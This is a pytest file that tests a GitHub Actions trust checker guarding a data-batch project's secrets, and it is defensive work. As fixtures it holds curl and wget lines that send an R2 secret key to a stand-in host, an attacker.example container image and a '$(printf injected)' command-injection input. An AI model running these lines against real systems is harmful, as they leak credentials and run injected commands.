from __future__ import annotations

import hashlib
import socket
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

import pytest
import yaml
from tools.quality.drift.check_workflow_trust import check, check_workflow

from baibai_batch.validation.workflow_inputs import (
    WorkflowInputError,
    validate_backfill_inputs,
    validate_daily_input,
)

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github" / "workflows"

CHECKOUT_SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
R2_CREDENTIAL_NAMES = {"R2_ACCOUNT_ID", "R2_ACCESS_KEY_ID", "R2_SECRET_ACCESS_KEY"}
EXPECTED_CREDENTIAL_NAMES = {
    "Pull stores": R2_CREDENTIAL_NAMES,
    "Hydrate market store from the L1 release": R2_CREDENTIAL_NAMES,
    "Publish the L1 release": R2_CREDENTIAL_NAMES,
    "Pull the market store": R2_CREDENTIAL_NAMES,
    "Run daily batch": {"JQUANTS_API_KEY", "ESTAT_APP_ID", "EDINET_API_KEY"},
    "Upload machine stores and serving views": R2_CREDENTIAL_NAMES,
    "Publish serving history and freshness": R2_CREDENTIAL_NAMES,
    "Upload serving objects": R2_CREDENTIAL_NAMES,
    "Upload run summary": R2_CREDENTIAL_NAMES,
    "Notify Discord #batch-runs": {"DISCORD_WEBHOOK_URL"},
    "Backfill and publish committed progress": {
        *R2_CREDENTIAL_NAMES,
        "JQUANTS_API_KEY",
    },
    "Deploy Worker and UI assets": {"CLOUDFLARE_API_TOKEN", "CLOUDFLARE_ACCOUNT_ID"},
}
EXPECTED_COMMAND_DIGESTS = {
    "Pull stores": "509a1709484d601560ecf758f615372822ffee307542e47efe2ddfb36eae2c9c",
    "Pull the market store": "395ec7ad8ac253d16bdc5db38fc900d56745aac63fd668035ab9c50f9af3c5bf",
    "Run daily batch": "afc553515df1b1e1e0cfaddbd0c78360ddb7aa6568cf4f3082ae92a4a9859ba1",
    "Upload machine stores and serving views": (
        "8b340d153936088076375788e38f097b7843a45e6c648ac626a0e1e68d2b69e8"
    ),
    "Publish serving history and freshness": (
        "b4f7598cddeb3659b4cdb38409f7310d672c871284d42b5e55d307e2b2ac698e"
    ),
    "Upload serving objects": "9d24808d70e44a83714b0467ff39e9d460f2cea82c6c43aac55f074d339643cf",
    "Upload run summary": "0e82a34f7e5ac9aa09683356fc3324a608e9d18ff9618ff57712564d8b377fe1",
    "Hydrate market store from the L1 release": (
        "9ecafc1d17e20380cde4d1cc37be9876f4ebd3a1162f45005187c7eaabede1c9"
    ),
    "Publish the L1 release": ("e4cd247b545df25f59d1ab40cecb94177baae54f841130ed4c61199495756905"),
    "Notify Discord #batch-runs": (
        "a98e9a25a4fd7b12f33677250dd4f416a47a13c75317c9e3fffd3bf1d871c612"
    ),
    "Backfill and publish committed progress": (
        "1cf9306ca4460c2c257a41ccfe84d75549729dd4f2e003c235f79885d5e494b3"
    ),
    "Deploy Worker and UI assets": (
        "cf2ce1d4ea6356847ba8e230a865b1c0c15e2a1726202a660cef7991e900bd77"
    ),
}
VALID_WORKFLOW = f"""\
name: fixture
on: push
jobs:
  quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{CHECKOUT_SHA} # v7.0.1
      - name: Harmless
        run: echo ok
"""


def _fixture(tmp_path: Path, text: str, *, name: str = "fixture.yml") -> Path:
    path = tmp_path / name
    path.write_text(text, encoding="utf-8")
    return path


def test_current_workflows_satisfy_the_trust_gate() -> None:
    assert check(ROOT) == []


@pytest.mark.parametrize(
    ("old", "new", "expected"),
    [
        (
            "types: [labeled]",
            "types: [opened, synchronize, labeled]",
            "trigger must be owner-approved PR label",
        ),
        (
            "github.actor == github.repository_owner",
            "github.actor != ''",
            "credential job must require owner label",
        ),
        (
            "github.event.pull_request.head.repo.full_name == github.repository",
            "github.event.pull_request.head.repo.full_name != ''",
            "credential job must require owner label",
        ),
        (
            "persist-credentials: false",
            "persist-credentials: true",
            "without persisting credentials",
        ),
        (
            "EXPECTED_PR_SHA: ${{ github.event.pull_request.head.sha }}",
            "EXPECTED_PR_SHA: ${{ github.sha }}",
            "exact head sources must stay event-bound",
        ),
        (
            "    runs-on: ubuntu-latest\n",
            (
                "    runs-on: ubuntu-latest\n"
                "    defaults:\n"
                "      run:\n"
                "        shell: bash -c 'bash -e {0}'\n"
            ),
            "reviewed execution context contract",
        ),
        (
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    container: attacker.example/image:latest\n",
            "reviewed execution context contract",
        ),
        (
            "    runs-on: ubuntu-latest",
            "    runs-on: self-hosted",
            "reviewed execution context contract",
        ),
    ],
)
def test_lake_acceptance_premerge_trust_boundary_rejects_mutation(
    tmp_path: Path,
    old: str,
    new: str,
    expected: str,
) -> None:
    text = (WORKFLOWS / "lake-acceptance.yml").read_text(encoding="utf-8")
    assert old in text
    path = _fixture(tmp_path, text.replace(old, new, 1), name="lake-acceptance.yml")

    errors = check_workflow(path)

    assert any(expected in error for error in errors)


@pytest.mark.parametrize(
    "expression",
    [
        "${{ inputs.asof }}",
        "${{ inputs['asof'] }}",
        "${{ github.event.inputs.asof }}",
        "${{ github.event['inputs']['asof'] }}",
        "${{ github['event']['inputs']['asof'] }}",
    ],
)
def test_direct_dispatch_expression_in_run_is_rejected(tmp_path: Path, expression: str) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace("echo ok", f'echo "{expression}"'),
    )

    errors = check_workflow(path)

    assert any("inputs.* must pass through step env" in error for error in errors)


def test_dispatch_input_expression_outside_validation_env_is_rejected(tmp_path: Path) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace(
            "      - name: Harmless\n",
            "      - name: Harmless\n        env:\n          VALUE: ${{ inputs.asof }}\n",
        ),
    )

    errors = check_workflow(path)

    assert any("dispatch input is outside its validation step env" in error for error in errors)


@pytest.mark.parametrize(
    ("old", "new", "expected"),
    [
        (
            'python3 -m baibai_batch.validation.workflow_inputs daily --asof "$MANUAL_ASOF"',
            "true",
            "validation command must match the fail-closed contract",
        ),
        (
            'python3 -m baibai_batch.validation.workflow_inputs daily --asof "$MANUAL_ASOF"',
            'python3 -m baibai_batch.validation.workflow_inputs daily --asof "$MANUAL_ASOF" || true',
            "validation command must match the fail-closed contract",
        ),
        (
            "        id: validate-input\n",
            "        id: validate-input\n        continue-on-error: true\n",
            "validation step must not set continue-on-error",
        ),
        (
            "        id: validate-input\n",
            "        id: validate-input\n        shell: bash {0}\n",
            "validation step must not set shell",
        ),
    ],
)
def test_validation_step_fail_closed_contract_rejects_mutation(
    tmp_path: Path,
    old: str,
    new: str,
    expected: str,
) -> None:
    text = (WORKFLOWS / "cloud-daily-batch.yml").read_text(encoding="utf-8")
    assert old in text
    path = _fixture(tmp_path, text.replace(old, new, 1), name="cloud-daily-batch.yml")

    errors = check_workflow(path)

    assert any(expected in error for error in errors)


def test_validated_output_cannot_be_replaced_with_raw_dispatch_input(tmp_path: Path) -> None:
    text = (WORKFLOWS / "cloud-daily-batch.yml").read_text(encoding="utf-8")
    path = _fixture(
        tmp_path,
        text.replace(
            "${{ steps.validate-input.outputs.asof }}",
            "${{ github['event']['inputs']['asof'] }}",
            1,
        ),
        name="cloud-daily-batch.yml",
    )

    errors = check_workflow(path)

    assert any("dispatch input is outside its validation step env" in error for error in errors)


@pytest.mark.parametrize(
    "unknown_command",
    [
        'curl -fsS https://example.invalid/?key="$R2_SECRET_ACCESS_KEY"',
        'wget -qO- https://example.invalid/?key="$R2_SECRET_ACCESS_KEY"',
        "python3 -c \"import urllib.request; urllib.request.urlopen('https://example.invalid')\"",
    ],
)
def test_credential_step_rejects_any_unreviewed_command(
    tmp_path: Path, unknown_command: str
) -> None:
    text = (WORKFLOWS / "cloud-daily-batch.yml").read_text(encoding="utf-8")
    path = _fixture(
        tmp_path,
        text.replace(
            "          batch/scripts/r2_transfer.sh pull-app",
            f"          batch/scripts/r2_transfer.sh pull-app\n          {unknown_command}",
            1,
        ),
        name="cloud-daily-batch.yml",
    )

    errors = check_workflow(path)

    assert any("credential-bearing step differs" in error for error in errors)


@pytest.mark.parametrize(
    "injection",
    [
        "    env:\n      TOKEN: ${{ secrets.JQUANTS_API_KEY }}\n",
        "      - name: Harmless\n        with:\n          token: ${{ secrets.JQUANTS_API_KEY }}\n",
        "      - name: Harmless\n        env:\n          TOKEN: ${{ secrets['JQUANTS_API_KEY'] }}\n",
        "      - name: Harmless\n        env:\n          TOKEN: ${{ secrets.UNRELATED }}\n",
    ],
)
def test_secret_outside_an_approved_target_step_env_is_rejected(
    tmp_path: Path, injection: str
) -> None:
    marker = "    steps:\n" if injection.startswith("    env:") else "      - name: Harmless\n"
    text = VALID_WORKFLOW.replace(marker, injection + marker)
    path = _fixture(tmp_path, text)

    errors = check_workflow(path)

    assert any("credential is outside its target step env" in error for error in errors)


@pytest.mark.parametrize(
    ("reference", "comment", "expected"),
    [
        ("actions/checkout@v7", "", "must use reviewed full commit SHA"),
        ("actions/checkout@3d3c42e5", "# v7.0.1", "must use reviewed full commit SHA"),
        (
            f"actions/checkout@{CHECKOUT_SHA}",
            "",
            "must carry release comment v7.0.1",
        ),
        (
            f"actions/checkout@{CHECKOUT_SHA}",
            "# v7.0.0",
            "must carry release comment v7.0.1",
        ),
        (
            "untrusted/example@0123456789abcdef0123456789abcdef01234567",
            "# v1.2.3",
            "unreviewed external action",
        ),
    ],
)
def test_mutable_or_unreviewed_action_reference_is_rejected(
    tmp_path: Path,
    reference: str,
    comment: str,
    expected: str,
) -> None:
    replacement = f"      - uses: {reference}"
    if comment:
        replacement += f" {comment}"
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace(
            f"      - uses: actions/checkout@{CHECKOUT_SHA} # v7.0.1",
            replacement,
        ),
    )

    errors = check_workflow(path)

    assert any(expected in error for error in errors)


def test_inline_action_reference_cannot_bypass_release_comment_check(tmp_path: Path) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace(
            f"      - uses: actions/checkout@{CHECKOUT_SHA} # v7.0.1",
            f"      - {{uses: actions/checkout@{CHECKOUT_SHA}}}",
        ),
    )

    errors = check_workflow(path)

    assert any("external uses must be a standalone pinned line" in error for error in errors)


def test_uses_text_inside_a_run_script_is_not_treated_as_an_action(tmp_path: Path) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace("run: echo ok", "run: |\n          echo 'uses: prose@tag'"),
    )

    assert check_workflow(path) == []


def test_yaml_extension_is_included_in_repository_scan(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "fixture.yaml").write_text(
        VALID_WORKFLOW.replace("echo ok", 'echo "${{ inputs.asof }}"'),
        encoding="utf-8",
    )

    errors = check(tmp_path)

    assert any(error.startswith("fixture.yaml:") for error in errors)


def _workflow(name: str) -> dict[str, object]:
    loaded = yaml.load((WORKFLOWS / name).read_text(encoding="utf-8"), Loader=yaml.BaseLoader)
    assert isinstance(loaded, dict)
    return loaded


def _steps(name: str, job_name: str) -> list[dict[str, object]]:
    workflow = _workflow(name)
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs[job_name]
    assert isinstance(job, dict)
    steps = job["steps"]
    assert isinstance(steps, list)
    return steps


@dataclass
class WorkflowCommandStub:
    """Record workflow boundaries without executing a command or opening a socket."""

    invocations: list[tuple[str, dict[str, str], str]] = field(default_factory=list)

    def invoke(self, step: dict[str, object]) -> None:
        name = str(step.get("name", step.get("uses", "unnamed")))
        raw_env = step.get("env", {})
        assert isinstance(raw_env, dict)
        credentials = {
            str(key): f"stub-value:{key}"
            for key, value in raw_env.items()
            if "${{ secrets." in str(value) or str(value) == "${{ vars.R2_ACCOUNT_ID }}"
        }
        command = _normalize_command(str(step.get("run", step.get("uses", ""))))
        self.invocations.append((name, credentials, command))


def _normalize_command(script: str) -> str:
    lines = script.splitlines()
    while lines and not lines[0].strip():
        lines.pop(0)
    while lines and not lines[-1].strip():
        lines.pop()
    if not lines:
        return ""
    indentation = min(len(line) - len(line.lstrip()) for line in lines if line.strip())
    return "\n".join(line[indentation:].rstrip() for line in lines)


def _simulate(
    *,
    workflow_name: str,
    job_name: str,
    inputs: dict[str, str],
    fail_step: str | None = None,
) -> WorkflowCommandStub:
    stub = WorkflowCommandStub()
    failed = False
    validation_succeeded = False
    for step in _steps(workflow_name, job_name):
        name = str(step.get("name", step.get("uses", "unnamed")))
        condition = str(step.get("if", ""))
        always = "always()" in condition
        if failed and not always:
            continue
        if "steps.validate-input.outcome == 'success'" in condition and not validation_succeeded:
            continue
        try:
            if name == "Validate dispatch input":
                validate_daily_input(asof=inputs.get("asof", ""))
                validation_succeeded = True
            elif name == "Validate dispatch inputs":
                validate_backfill_inputs(
                    start=inputs.get("start", ""),
                    end=inputs.get("end", ""),
                    master_month_end_from=inputs.get("master_month_end_from", ""),
                )
                validation_succeeded = True
        except WorkflowInputError:
            failed = True
        stub.invoke(step)
        if name == fail_step:
            failed = True
    return stub


def _credential_invocations(stub: WorkflowCommandStub) -> dict[str, dict[str, str]]:
    return {name: credentials for name, credentials, _command in stub.invocations if credentials}


@pytest.mark.parametrize(
    ("workflow_name", "job_name", "inputs", "fail_step", "expected_steps"),
    [
        (
            "cloud-history-backfill.yml",
            "backfill",
            {"start": "2026-01-01", "end": "2026-08-01"},
            None,
            {
                "Pull the market store",
                "Hydrate market store from the L1 release",
                "Backfill and publish committed progress",
            },
        ),
        (
            "cloud-history-backfill.yml",
            "backfill",
            {"start": "2026-08-02", "end": "2026-08-01"},
            None,
            set(),
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": ""},
            None,
            {
                "Pull stores",
                "Hydrate market store from the L1 release",
                "Run daily batch",
                "Publish the L1 release",
                "Upload machine stores and serving views",
                "Publish serving history and freshness",
                "Notify Discord #batch-runs",
                "Upload run summary",
            },
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": "2026-08-01"},
            None,
            {
                "Pull stores",
                "Hydrate market store from the L1 release",
                "Run daily batch",
                "Publish the L1 release",
                "Upload machine stores and serving views",
                "Publish serving history and freshness",
                "Notify Discord #batch-runs",
                "Upload run summary",
            },
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": "$(printf injected)"},
            None,
            {"Notify Discord #batch-runs"},
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": "2026-08-01"},
            "Run daily batch",
            {
                "Pull stores",
                "Hydrate market store from the L1 release",
                "Run daily batch",
                "Notify Discord #batch-runs",
                "Upload run summary",
            },
        ),
        (
            "cloud-materialize.yml",
            "materialize",
            {},
            None,
            {
                "Pull stores",
                "Hydrate market store from the L1 release",
                "Upload serving objects",
            },
        ),
        (
            "web.yml",
            "quality",
            {},
            None,
            {"Deploy Worker and UI assets"},
        ),
    ],
)
def test_deterministic_workflow_stub_exposes_credentials_only_to_target_steps(
    workflow_name: str,
    job_name: str,
    inputs: dict[str, str],
    fail_step: str | None,
    expected_steps: set[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    network_attempts: list[str] = []

    def reject_network(*_args: object, **_kwargs: object) -> None:
        network_attempts.append("network")
        raise AssertionError("workflow stub attempted a real network request")

    monkeypatch.setattr(socket, "create_connection", reject_network)
    monkeypatch.setattr(socket.socket, "connect", reject_network)
    monkeypatch.setattr(urllib.request, "urlopen", reject_network)
    stub = _simulate(
        workflow_name=workflow_name,
        job_name=job_name,
        inputs=inputs,
        fail_step=fail_step,
    )

    credential_invocations = _credential_invocations(stub)
    assert set(credential_invocations) == expected_steps
    assert {
        step_name: set(credentials) for step_name, credentials in credential_invocations.items()
    } == {step_name: EXPECTED_CREDENTIAL_NAMES[step_name] for step_name in expected_steps}
    assert all(
        value == f"stub-value:{name}"
        for credentials in credential_invocations.values()
        for name, value in credentials.items()
    )
    command_digests = {
        name: hashlib.sha256(command.encode()).hexdigest()
        for name, credentials, command in stub.invocations
        if credentials
    }
    assert command_digests == {name: EXPECTED_COMMAND_DIGESTS[name] for name in expected_steps}
    assert all(command for _name, _credentials, command in stub.invocations)
    assert network_attempts == []
